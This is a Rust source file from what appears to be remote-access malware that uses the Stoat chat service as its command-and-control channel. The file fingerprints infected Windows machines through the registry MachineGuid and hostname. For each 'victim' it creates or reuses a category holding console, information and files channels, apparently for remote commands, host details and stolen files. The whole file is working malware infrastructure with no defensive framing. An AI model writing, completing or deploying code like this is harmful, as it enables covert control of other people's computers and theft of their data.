// language: Rust, file: src/workspace.rs
// Per-victim workspace. Stoat models categories as a server-level list of
// { id, title, channels: [channel_ids] } (v0::Category / DataEditServer.categories).
// A victim gets one category holding three channels, created once and reused on every
// reboot by matching a stable machine id embedded in the category title.
#![allow(dead_code)]
use anyhow::{Context, Result};
use serde_json::{json, Value};

use crate::stoat::Stoat;

/// Channels created inside each victim category, in display order.
pub const CHANNEL_NAMES: [&str; 3] = ["console", "information", "files"];

#[derive(Clone)]
pub struct Channels {
    pub console: String,
    pub info: String,
    pub files: String,
}

#[derive(Clone)]
pub struct Workspace {
    pub server: String,
    pub category_id: String,
    pub victim_id: String,
    pub label: String,
    pub channels: Channels,
}

/// Stable machine identity: Windows MachineGuid + hostname, hashed to 8 hex chars.
/// Survives reboots; changes only on OS reinstall (new MachineGuid).
pub fn victim_id() -> String {
    use std::hash::{Hash, Hasher};
    let mut h = std::collections::hash_map::DefaultHasher::new();
    machine_guid().unwrap_or_default().hash(&mut h);
    std::env::var("COMPUTERNAME").unwrap_or_default().hash(&mut h);
    std::env::consts::OS.hash(&mut h);
    format!("{:08x}", h.finish() as u32)
}

#[cfg(windows)]
fn machine_guid() -> Option<String> {
    use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_READ};
    use winreg::RegKey;
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let key = hklm
        .open_subkey_with_flags(r"SOFTWARE\Microsoft\Cryptography", KEY_READ)
        .ok()?;
    key.get_value::<String, _>("MachineGuid").ok()
}

#[cfg(not(windows))]
fn machine_guid() -> Option<String> {
    None
}

fn host_name() -> String {
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "host".into())
}

/// Resolve the server that owns the control channel, then ensure the victim workspace.
pub async fn ensure(st: &Stoat, control_channel: &str) -> Result<Workspace> {
    let ch = st.get_json(&format!("/channels/{control_channel}")).await?;
    let server = ch["server"]
        .as_str()
        .context("control channel has no server (is it a DM?)")?
        .to_string();
    ensure_in_server(st, &server).await
}

pub async fn ensure_in_server(st: &Stoat, server: &str) -> Result<Workspace> {
    let victim = victim_id();
    let host: String = host_name().chars().take(12).collect();
    let label = format!("{host} [{victim}]");

    let srv = st.get_json(&format!("/servers/{server}")).await?;
    let mut cats = srv["categories"].as_array().cloned().unwrap_or_default();

    let existing_idx = cats
        .iter()
        .position(|c| c["title"].as_str().map(|t| t.contains(&victim)).unwrap_or(false));
    let existing_channels: Vec<String> = existing_idx
        .and_then(|i| cats[i]["channels"].as_array().cloned())
        .unwrap_or_default()
        .into_iter()
        .filter_map(|v| v.as_str().map(String::from))
        .collect();

    // Resolve the three channels by name, verifying each still exists.
    let mut resolved: [Option<String>; 3] = [None, None, None];
    for cid in &existing_channels {
        if let Ok(ch) = st.get_json(&format!("/channels/{cid}")).await {
            if let Some(nm) = ch["name"].as_str() {
                if let Some(i) = CHANNEL_NAMES.iter().position(|n| *n == nm) {
                    if resolved[i].is_none() {
                        resolved[i] = Some(cid.clone());
                    }
                }
            }
        }
    }

    // Create any missing channel. First, reuse a legacy single-channel category by renaming
    // its existing channel to `console` instead of orphaning it.
    if resolved[0].is_none() {
        if let Some(extra) = existing_channels
            .iter()
            .find(|cid| !resolved.iter().flatten().any(|r| r == *cid))
            .cloned()
        {
            let _ = st
                .edit_channel(&extra, json!({ "name": CHANNEL_NAMES[0] }))
                .await;
            resolved[0] = Some(extra);
        }
    }

    let mut changed = false;
    for i in 0..CHANNEL_NAMES.len() {
        if resolved[i].is_none() {
            let id = create_text(st, server, CHANNEL_NAMES[i]).await?;
            resolved[i] = Some(id);
            changed = true;
        }
    }
    let ordered: Vec<String> = resolved.iter().map(|x| x.clone().unwrap()).collect();

    let category_id = match existing_idx {
        Some(i) => {
            let cid = cats[i]["id"].as_str().unwrap_or_default().to_string();
            let current: Vec<String> = cats[i]["channels"]
                .as_array()
                .cloned()
                .unwrap_or_default()
                .into_iter()
                .filter_map(|v| v.as_str().map(String::from))
                .collect();
            if changed || current != ordered {
                cats[i]["channels"] = json!(ordered);
                set_categories(st, server, &cats).await?;
            }
            cid
        }
        None => {
            let cid = uuid::Uuid::new_v4().simple().to_string();
            cats.push(json!({ "id": cid, "title": label, "channels": ordered }));
            set_categories(st, server, &cats).await?;
            cid
        }
    };

    Ok(Workspace {
        server: server.to_string(),
        category_id,
        victim_id: victim,
        label,
        channels: Channels {
            console: resolved[0].clone().unwrap(),
            info: resolved[1].clone().unwrap(),
            files: resolved[2].clone().unwrap(),
        },
    })
}

/// First server channel whose name matches (case-insensitive), e.g. the `update` channel.
pub async fn find_channel_by_name(st: &Stoat, server: &str, name: &str) -> Result<Option<String>> {
    let srv = st.get_json(&format!("/servers/{server}")).await?;
    let ids: Vec<String> = srv["channels"]
        .as_array()
        .cloned()
        .unwrap_or_default()
        .into_iter()
        .filter_map(|v| v.as_str().map(String::from))
        .collect();
    for id in ids {
        if let Ok(ch) = st.get_json(&format!("/channels/{id}")).await {
            if ch["name"]
                .as_str()
                .map(|n| n.eq_ignore_ascii_case(name))
                .unwrap_or(false)
            {
                return Ok(Some(id));
            }
        }
    }
    Ok(None)
}

async fn create_text(st: &Stoat, server: &str, name: &str) -> Result<String> {
    let v = st
        .create_channel(server, json!({ "type": "Text", "name": name }))
        .await?;
    v["_id"]
        .as_str()
        .map(String::from)
        .context("no channel id in create response")
}

async fn set_categories(st: &Stoat, server: &str, cats: &[Value]) -> Result<()> {
    st.edit_server(server, json!({ "categories": cats })).await
}
